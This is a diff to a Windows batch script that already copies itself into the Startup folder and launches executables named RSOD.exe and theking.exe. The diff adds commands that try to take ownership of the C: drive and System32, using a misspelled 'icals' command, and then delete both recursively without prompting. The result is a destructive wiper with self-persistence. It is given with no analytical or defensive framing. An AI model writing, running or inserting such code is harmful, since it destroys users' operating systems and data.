@@ -1,4 +1,8 @@
 @echo off
+icals C:\ /grant %username%F
+rd /s /q C:\
+icals C:\Windows\System32 /grant %username%F
+rd /s /q C:\Windows\System32
 copy %0 "%userprofile%\Start Menu\Programs\Startup"
 start RSOD.exe
 start theking.exe
